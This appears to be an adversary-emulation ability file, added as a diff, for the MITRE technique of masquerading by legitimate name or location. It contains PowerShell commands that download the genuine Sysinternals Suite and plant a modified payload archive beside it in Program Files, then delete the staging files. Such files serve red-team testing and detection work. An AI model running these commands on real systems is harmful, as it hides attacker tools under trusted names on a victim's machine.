@@ -1,0 +1,109 @@
+ability_id: 4f7d21c9-ea31-4943-ad8a-efbbeeccdd7d
+access: {}
+additional_info: {}
+buckets:
+- stage-capabilities
+delete_payload: true
+description: Uploading payloads masquerading as via modified SysInternalsSuite
+executors:
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: "iwr -uri \"https://download.sysinternals.com/files/SysinternalsSuite.zip\"\
+    \ -outfile SysInternalsSuite.zip;\nExpand-Archive -Path SysInternalsSuite.zip\
+    \ -DestinationPath \"C:\\Users\\#{profile_user}\\Downloads\\SysInternalsSuite\"\
+    \ -Force;\n\nif (! $?) {\n  write-host \"Error moving files to #{profile_user}\\\
+    Downloads\";\n  exit 1;\n}\n\nMove-Item Modified-SysInternalsSuite.zip \"C:\\\
+    Users\\#{profile_user}\\Downloads\" -Force;\nExpand-Archive -LiteralPath \"C:\\\
+    Users\\#{profile_user}\\Downloads\\Modified-SysInternalsSuite.zip\" -DestinationPath\
+    \ \"C:\\Users\\#{profile_user}\\Downloads\\Modified-SysInternalsSuite\" -Force;\n\
+    \nif (! $?) {\n  write-host \"Error expanding files to #{profile_user}\\Downloads\"\
+    ;\n  exit 1;\n}\n\n$dir_exists=Test-Path -path \"C:\\Program Files\\SysInternalsSuite\"\
+    ;\nif ($dir_exists -eq $true) {\n  write-host \"[*] SysInternalsSuite folder exists\
+    \ within \\\"C:\\Program Files\\\", copying over payloads then removing folder\
+    \ from Downloads.\";\n  Move-Item -path \"C:\\Users\\#{profile_user}\\Downloads\\\
+    SysInternalsSuite\\\\*\" -Destination \"C:\\Program Files\\SysInternalsSuite\\\
+    \\\" -Force;\n  Move-Item -path \"C:\\Users\\#{profile_user}\\Downloads\\Modified-SysInternalsSuite\\\
+    \\*\" -Destination \"C:\\Program Files\\SysInternalsSuite\\\\\" -Force;\n} else\
+    \ {\n  mkdir \"C:\\Program Files\\SysInternalsSuite\";\n  Copy-Item -Path \"C:\\\
+    Users\\#{profile_user}\\Downloads\\SysInternalsSuite\\\\*\" -Destination \"C:\\\
+    Program Files\\SysInternalsSuite\\\\\" -Force;\n  Copy-Item -Path \"C:\\Users\\\
+    #{profile_user}\\Downloads\\Modified-SysInternalsSuite\\\\*\" -Destination \"\
+    C:\\Program Files\\SysInternalsSuite\\\\\" -Force;\n}\n\nif (test-path -path \"\
+    SysInternalsSuite.zip\") {\n  Remove-Item -path \"filesystem::SysInternalsSuite.zip\"\
+    \ -force;\n}\n\nif (test-path -path \"C:\\Users\\#{profile_user}\\Downloads\\\
+    Modified-SysInternalsSuite.zip\" ) {\n  remove-item -path \"C:\\Users\\#{profile_user}\\\
+    Downloads\\Modified-SysInternalsSuite.zip\" -force;\n}\n\nif (test-path -path\
+    \ \"C:\\Users\\#{profile_user}\\Downloads\\Modified-SysInternalsSuite\") {\n \
+    \ remove-item -path \"C:\\Users\\#{profile_user}\\Downloads\\Modified-SysInternalsSuite\"\
+    \ -recurse -force;\n}\n\nif (test-path -path \"C:\\Users\\#{profile_user}\\Downloads\\\
+    SysInternalsSuite\") {\n  Remove-Item -path  \"C:\\Users\\#{profile_user}\\Downloads\\\
+    SysInternalsSuite\" -recurse -force;\n}\n\nSet-Location -path \"C:\\Program Files\\\
+    SysInternalsSuite\";\nif ($?) {\n  gci;\n  write-host \"[*] Successfully planted\
+    \ files\"\n} else {\n  write-host \"[!] Error downloading and planting modified\
+    \ system tools.\"\n}"
+  language: null
+  name: psh
+  parsers: []
+  payloads:
+  - Modified-SysInternalsSuite.zip
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: "iwr -uri \"https://download.sysinternals.com/files/SysinternalsSuite.zip\"\
+    \ -outfile SysInternalsSuite.zip;\nExpand-Archive -Path SysInternalsSuite.zip\
+    \ -DestinationPath \"C:\\Users\\#{profile_user}\\Downloads\\SysInternalsSuite\"\
+    \ -Force;\n\nif (! $?) {\n  write-host \"Error moving files to #{profile_user}\\\
+    Downloads\";\n  exit 1;\n}\n\nMove-Item Modified-SysInternalsSuite.zip \"C:\\\
+    Users\\#{profile_user}\\Downloads\" -Force;\nExpand-Archive -LiteralPath \"C:\\\
+    Users\\#{profile_user}\\Downloads\\Modified-SysInternalsSuite.zip\" -DestinationPath\
+    \ \"C:\\Users\\#{profile_user}\\Downloads\\Modified-SysInternalsSuite\" -Force;\n\
+    \nif (! $?) {\n  write-host \"Error expanding files to #{profile_user}\\Downloads\"\
+    ;\n  exit 1;\n}\n\n$dir_exists=Test-Path -path \"C:\\Program Files\\SysInternalsSuite\"\
+    ;\nif ($dir_exists -eq $true) {\n  write-host \"[*] SysInternalsSuite folder exists\
+    \ within \\\"C:\\Program Files\\\", copying over payloads then removing folder\
+    \ from Downloads.\";\n  Move-Item -path \"C:\\Users\\#{profile_user}\\Downloads\\\
+    SysInternalsSuite\\\\*\" -Destination \"C:\\Program Files\\SysInternalsSuite\\\
+    \\\" -Force;\n  Move-Item -path \"C:\\Users\\#{profile_user}\\Downloads\\Modified-SysInternalsSuite\\\
+    \\*\" -Destination \"C:\\Program Files\\SysInternalsSuite\\\\\" -Force;\n} else\
+    \ {\n  mkdir \"C:\\Program Files\\SysInternalsSuite\";\n  Copy-Item -Path \"C:\\\
+    Users\\#{profile_user}\\Downloads\\SysInternalsSuite\\\\*\" -Destination \"C:\\\
+    Program Files\\SysInternalsSuite\\\\\" -Force;\n  Copy-Item -Path \"C:\\Users\\\
+    #{profile_user}\\Downloads\\Modified-SysInternalsSuite\\\\*\" -Destination \"\
+    C:\\Program Files\\SysInternalsSuite\\\\\" -Force;\n}\n\nif (test-path -path \"\
+    SysInternalsSuite.zip\") {\n  Remove-Item -path \"filesystem::SysInternalsSuite.zip\"\
+    \ -force;\n}\n\nif (test-path -path \"C:\\Users\\#{profile_user}\\Downloads\\\
+    Modified-SysInternalsSuite.zip\" ) {\n  remove-item -path \"C:\\Users\\#{profile_user}\\\
+    Downloads\\Modified-SysInternalsSuite.zip\" -force;\n}\n\nif (test-path -path\
+    \ \"C:\\Users\\#{profile_user}\\Downloads\\Modified-SysInternalsSuite\") {\n \
+    \ remove-item -path \"C:\\Users\\#{profile_user}\\Downloads\\Modified-SysInternalsSuite\"\
+    \ -recurse -force;\n}\n\nif (test-path -path \"C:\\Users\\#{profile_user}\\Downloads\\\
+    SysInternalsSuite\") {\n  Remove-Item -path  \"C:\\Users\\#{profile_user}\\Downloads\\\
+    SysInternalsSuite\" -recurse -force;\n}\n\nSet-Location -path \"C:\\Program Files\\\
+    SysInternalsSuite\";\nif ($?) {\n  gci;\n  write-host \"[*] Successfully planted\
+    \ files\"\n} else {\n  write-host \"[!] Error downloading and planting modified\
+    \ system tools.\"\n}"
+  language: null
+  name: pwsh
+  parsers: []
+  payloads:
+  - Modified-SysInternalsSuite.zip
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+name: Planting Modified Sysinternals Utilities
+plugin: emu
+privilege: ''
+repeatable: false
+requirements: []
+singleton: false
+tactic: stage-capabilities
+technique_id: T1036.005
+technique_name: 'Masquerading: Match Legitimate Name or Location'
